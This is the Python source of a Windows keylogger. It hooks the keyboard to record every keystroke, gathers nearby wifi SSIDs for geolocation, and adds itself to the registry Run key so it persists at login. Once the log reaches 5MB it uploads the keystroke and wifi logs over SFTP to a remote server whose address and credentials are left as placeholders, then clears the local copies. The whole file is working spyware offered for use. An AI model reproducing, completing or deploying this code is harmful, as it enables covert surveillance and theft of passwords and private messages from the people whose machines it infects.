'''

This is the windows version of our simplePythonKeylogger. It records keystrokes using pyHook, stores
them in a file called keylogs.txt and transmits back over ssh or email/cloud.

Exit by: <backspace><delete><backspace><delete>

Keylogs are sent when the keylog file reaches 5MB

'''
from sys import exit as sysExit
from sys import argv
from pyHook import HookManager
import pythoncom
import paramiko  # For SSH
import os
import threading
import datetime
import json
import socket  # To get hostname

from win32event import CreateMutex
from win32api import GetLastError
from winerror import ERROR_ALREADY_EXISTS

from _winreg import SetValueEx, OpenKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ  # For registry

from Tkinter import Frame, Tk, Button  # For GUI

import wifiGrab

data = ''  # To hold logged key
exitStack = []
hostAddress = '<YOUR IP ADDRESS>'
keylogsFile='keylogs.txt'
wifiLogsFile='wifiLogs.txt'
sshServerUsername = '<YOUR USERNAME>'
sshServerPassword = '<YOUR PASSWORD>'
root = Tk()  # Tk Object

def writeWifi():  # To get SSIDs of the wifi in the vicinity for geolocation
    f = open(wifiLogsFile, 'a+')
    t = wifiGrab.getWifi()
    f.write(str(datetime.datetime.now()) + '\n')
    json.dump(t, f, indent=4)  # write json to file
    f.write('\n\n\n')
    f.close()

def addToStartup():  # Add this to startup
    dirPath = os.getcwd()
    progName = argv[0].split("\\")[-1]
    dirPath = dirPath + '\\' + progName
    keyValue = r'Software\Microsoft\Windows\CurrentVersion\Run'

    currentKey = OpenKey(HKEY_CURRENT_USER, keyValue, 0, KEY_ALL_ACCESS)
    SetValueEx(currentKey, "keylogger", 0, REG_SZ, dirPath)


def sendFile():
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostAddress, username=sshServerUsername, password=sshServerPassword)
        sftp = client.open_sftp()
        hostname = socket.gethostname()  # Add hostname to our log file
        sftp.put(keylogsFile, '/home/eschatonic/Desktop/upload/keylogs-' + hostname + '-' + str(datetime.datetime.today())[0:19] + '.txt')
        sftp.put(wifiLogsFile, '/home/eschatonic/Desktop/upload/wifiLogs-' + hostname + '-' + str(datetime.datetime.today())[0:19] + '.txt')
        with open(keylogsFile, 'w') and open(wifiLogsFile, 'w'):  # Clear files
            pass
    except Exception, e:
        print e

# TODO email/cloud option to send log files

def writeKeylogs():
    global data
    try:
        # TODO Find a way to encrypt data
        f = open(keylogsFile, 'a+')
        f.write(data)
        f.close()
    except Exception, e:
        print str(e)
    return


class keylogger():
    def __init__(self):
        '''
        Disallow multiple instances.source: ajinabraham / Xenotix - Python - Keylogger
        '''
        self.mutex = CreateMutex(None, 1, 'mutex_var_xboz')
        if GetLastError() == ERROR_ALREADY_EXISTS:
            self.mutex = None
            print "Multiple Instance not Allowed"
            sysExit(0)

        addToStartup()  # Add to startup
        writeWifi()
        writeKeylogs()  # Create keylogs.txt in case it does not exist
        self.hooks_manager = HookManager()  # Create a hook
        self.hooks_manager.KeyDown = self.OnKeyBoardEvent  # Assign keydown event handler
        self.hooks_manager.HookKeyboard()  # assign hook to the keyboard
        pythoncom.PumpMessages()

    def OnKeyBoardEvent(self, event):  # This function is called when a key is pressed
        global timeNow
        global data
        global exitStack
        global keyLength
        global wifiLogsFile
        global keylogsFile

        # logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
        # logging.log(10,chr(event.Ascii))

        if event.Ascii == 8:
            key = '<BACKSPACE>'
        elif event.Ascii == 13:  # Carraige return representation
            key = '<ENTER>'
        elif event.Ascii == 9:  # TAB Representation
            key = '<TAB>'
        else:
            key = chr(event.Ascii)

        data += key

        if event.Ascii == 8:
            exitStack.append(event.Ascii)
        elif event.Ascii == 0:
            exitStack.append(event.Ascii)
        else:
            exitStack = []

        if len(exitStack) == 4:
            if exitStack[0] == 8 and exitStack[1] == 0 and exitStack[2] == 8 and exitStack[3] == 0:  # If last four values
                self.createExitGui()
            else:
                exitStack = []

        if len(data) == 128:  # Write data in chucks of 128 bytes
            writeKeylogs()
            data = ''

        if os.path.getsize(keylogsFile)>=5e+6:  # Send log file when it reaches 5MB
            t = threading.Thread(target=sendFile(), args=())
            t.start()

        return True

    def createExitGui(self):
        app = self.Application(root)         # Passing Tk object to our GUI implementation class
        app.mainloop()                       # entered were <back><del><back><del>
        root.destroy()                       # spawn a quit dialog box
        sysExit(1)

    class Application(Frame):  # Class for implementation of exitGui
        def CreateWidgets(self):
            self.QUIT = Button(self)
            self.QUIT["text"] = "QUIT"
            self.QUIT["fg"] = "red"
            self.QUIT["command"] = self.quit

            self.QUIT.pack({"side": "left"})

        def __init__(self, master=None):
            Frame.__init__(self, master)
            self.pack()
            self.CreateWidgets()
